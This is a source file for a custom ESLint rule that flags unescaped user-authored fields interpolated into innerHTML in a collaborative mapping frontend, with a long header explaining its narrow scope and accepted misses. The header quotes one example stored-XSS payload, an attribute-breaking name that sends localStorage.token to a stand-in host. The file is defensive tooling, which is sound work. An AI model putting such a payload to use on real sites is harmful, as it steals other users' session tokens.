// Path: eslint-rules/no-unescaped-innerhtml.js
// An interpolation dropped raw into `innerHTML` is stored XSS, and here it is
// stored XSS that TRAVELS: feature names, map names and 360 photo names are
// authored by one user, pushed through collaboration sync, and re-rendered
// inside someone else's session. The payload does not even need `<` or `>` — a
// name of `a" onmouseover="fetch('//x/'+localStorage.token)` closes an
// attribute and installs a handler. That is not hypothetical: the docstring of
// `js/utilities/html-escape.js` was written after exactly that finding, when
// `escapeHtml` turned out not to escape quotes and twenty-eight call sites
// interpolated into attributes. The house rule is: never `innerHTML` with user
// data; use `textContent`, `createElement`, or wrap in `escapeHtml()`.
//
// WHY THE RULE IS NARROW, AND WHAT IT DELIBERATELY LETS THROUGH.
// A syntactic rule cannot know whether `${x}` is user data or a constant of the
// code itself. Measured over `frontend/src/js/` (2026-08-13, 601 files): 178
// `innerHTML = <template>` assignments carrying 214 raw interpolations — but the
// large majority are inlined SVG icon constants (`${ICONS.TRASH}`), colors,
// counts and nested render helpers. Reporting all 214 would fail
// `--max-warnings 0` on day one, and the next developer's fix would be to switch
// the rule off. So the rule keys on the project's OWN naming convention for
// user-authored data (CLAUDE.md: "propriedade de feição em português: `nome`,
// `descricao`") plus the identity/name-bearing fields, and reports only those.
// Current cost: 3 violations, all verified real.
//
// Deliberately NOT reported (accepted misses, bought with zero false positives):
//   - any interpolation whose name is outside the lexicon: `${label}`,
//     `${config.title}`, `${option.name}`, `${format.description}`. Checked by
//     hand: in this repo those come from TAB_CONFIG, the export/import format
//     tables and the toolbar action arrays, i.e. constants of the code. Adding
//     such generic words costs ~20 false positives and catches nothing real.
//   - anything inside a CALL: `${formatarNome(nome)}`, `${renderRow(f)}`. The
//     callee may escape internally and we cannot tell, and a render helper that
//     returns HTML on purpose is the normal idiom here.
//   - `${err.message}` / `${msg}`: server- or exception-authored text. A real
//     but second-order vector, indistinguishable from developer-written strings.
//   - `insertAdjacentHTML`, `outerHTML`, `document.write`, and an innerHTML fed
//     by a variable built elsewhere (`el.innerHTML = html`). Out of syntactic
//     reach: this rule only reads a template literal written in the assignment.
//
// What it must never do is fire on the legitimate idioms, and the fixture
// `__fixtures__/should-pass.js` pins them: `el.innerHTML = ''`, any literal with
// no interpolation, `escapeHtml(nome)` / `sanitizeQuillHtml(html)` interpolated
// directly, and a local `const safeNome = escapeHtml(nome)` interpolated later.
// Note WHY the first two are quiet: not because the wrapper is recognised, but
// because no call is ever descended into — `escapeHtml(x)` is silent for exactly
// the same reason `renderRow(f)` is. The SAFE_WRAPPERS list below therefore
// earns its keep only on the const-indirection path, which is what the
// already-corrected call sites (`streetview360-section.component.js`,
// `models3d-section.component.js`) use; without it every fixed file would turn
// into a false positive. A mutation of that list moves should-pass.js from 0 to
// 2 reports, so it is load-bearing and not decoration.

/**
 * Functions that make their return value safe to interpolate into HTML. Only
 * consulted for `const safeX = escapeHtml(y)` — see the note in the header.
 */
const SAFE_WRAPPERS = new Set([
    'escapeHtml',
    'escapeXml',
    'sanitizeHtml',
    'sanitizeQuillHtml',
    'cleanQuillContent',
    'sanitize', // DOMPurify.sanitize
    'encodeURIComponent'
]);

/**
 * Names that carry user-authored text in this codebase. Anchored on the project
 * convention (feature properties in pt-BR) plus identity and file fields.
 * Matching is on the LAST segment, so `feature.properties.nome` and
 * `foto.display_name` both count.
 */
const USER_TEXT_FIELDS = new Set([
    // feature / entity properties (pt-BR convention)
    'nome',
    'descricao',
    'titulo',
    'texto',
    'observacao',
    'observacoes',
    'comentario',
    'autor',
    'apelido',
    'labelText',
    // identity
    'username',
    'userName',
    'email',
    'nomeCompleto',
    'fullName',
    'posto',
    'om',
    // files and search input
    'nomeArquivo',
    'fileName',
    'filename',
    'searchTerm',
    'termo'
]);

/** Name-bearing identifiers: `displayName`, `display_name`, `nomeDoMapa`. */
const NAME_SUFFIX = /(?:[a-z0-9](?:Name|Nome)|_name|_nome)$/;

function isUserTextName(name) {
    return USER_TEXT_FIELDS.has(name) || NAME_SUFFIX.test(name);
}

/** The callee's own name: `escapeHtml(x)` and `DOMPurify.sanitize(x)` alike. */
function calleeName(node) {
    const callee = node.callee;
    if (callee.type === 'Identifier') return callee.name;
    if (callee.type === 'MemberExpression' && !callee.computed && callee.property.type === 'Identifier') {
        return callee.property.name;
    }
    return null;
}

function isSafeCall(node) {
    return !!node && node.type === 'CallExpression' && SAFE_WRAPPERS.has(calleeName(node));
}

/** Last segment of an identifier or non-computed member chain; null otherwise. */
function tailName(node) {
    if (node.type === 'Identifier') return node.name;
    if (node.type === 'MemberExpression' && !node.computed && node.property.type === 'Identifier') {
        return node.property.name;
    }
    if (node.type === 'ChainExpression') return tailName(node.expression);
    return null;
}

function findVariable(scope, name) {
    for (let current = scope; current; current = current.upper) {
        const found = current.variables.find((variable) => variable.name === name);
        if (found) return found;
    }
    return null;
}

/**
 * True when `node` is a plain identifier bound to a single
 * `const safeX = escapeHtml(y)`. Written-to-twice variables are not trusted.
 */
function resolvesToSafeConst(node, scope) {
    if (node.type !== 'Identifier') return false;
    const variable = findVariable(scope, node.name);
    if (!variable || variable.defs.length !== 1) return false;
    const def = variable.defs[0];
    if (def.type !== 'Variable' || def.node.type !== 'VariableDeclarator') return false;
    if (variable.references.filter((ref) => ref.isWrite()).length > 1) return false;
    return isSafeCall(def.node.init);
}

/**
 * Collects the interpolations worth reporting. Descends only through the
 * value-preserving shapes (`a ? b : c`, `a || b`, `a + b`, nested templates) and
 * NEVER into a call's arguments — see the header for why.
 */
function collectSuspects(node, scope, out) {
    if (!node) return out;
    switch (node.type) {
        case 'ChainExpression':
            return collectSuspects(node.expression, scope, out);
        case 'Identifier':
        case 'MemberExpression': {
            const name = tailName(node);
            if (name && isUserTextName(name) && !resolvesToSafeConst(node, scope)) out.push(node);
            return out;
        }
        case 'ConditionalExpression':
            collectSuspects(node.consequent, scope, out);
            collectSuspects(node.alternate, scope, out);
            return out;
        case 'LogicalExpression':
            collectSuspects(node.left, scope, out);
            collectSuspects(node.right, scope, out);
            return out;
        case 'BinaryExpression':
            if (node.operator === '+') {
                collectSuspects(node.left, scope, out);
                collectSuspects(node.right, scope, out);
            }
            return out;
        case 'TemplateLiteral':
            node.expressions.forEach((expression) => collectSuspects(expression, scope, out));
            return out;
        default:
            return out;
    }
}

/** Unwraps `cond ? <template> : ''` and `x || <template>` down to the templates. */
function templatesIn(node, out = []) {
    if (!node) return out;
    if (node.type === 'TemplateLiteral') {
        out.push(node);
    } else if (node.type === 'ConditionalExpression') {
        templatesIn(node.consequent, out);
        templatesIn(node.alternate, out);
    } else if (node.type === 'LogicalExpression') {
        templatesIn(node.left, out);
        templatesIn(node.right, out);
    }
    return out;
}

/** True for `x.innerHTML` and `x['innerHTML']`. */
function isInnerHtmlTarget(node) {
    if (node.type !== 'MemberExpression') return false;
    if (node.computed) return node.property.type === 'Literal' && node.property.value === 'innerHTML';
    return node.property.type === 'Identifier' && node.property.name === 'innerHTML';
}

export default {
    meta: {
        type: 'problem',
        docs: {
            description:
                'proíbe interpolação de dado do usuário sem escape em atribuição a innerHTML'
        },
        schema: [],
        messages: {
            unescaped:
                'Interpolação sem escape em innerHTML: `{{ name }}` entra como HTML cru e vira XSS armazenado (nome autorado por um usuário viaja pelo sync e renderiza na sessão de outro). Envolva em `escapeHtml()` de `@utils/html-escape.js`, ou monte o nó com `textContent`/`createElement`.'
        }
    },
    create(context) {
        const sourceCode = context.sourceCode;

        return {
            AssignmentExpression(node) {
                if (node.operator !== '=' && node.operator !== '+=') return;
                if (!isInnerHtmlTarget(node.left)) return;

                const scope = sourceCode.getScope(node);
                for (const template of templatesIn(node.right)) {
                    for (const expression of template.expressions) {
                        for (const suspect of collectSuspects(expression, scope, [])) {
                            context.report({
                                node: suspect,
                                messageId: 'unescaped',
                                data: { name: sourceCode.getText(suspect) }
                            });
                        }
                    }
                }
            }
        };
    }
};
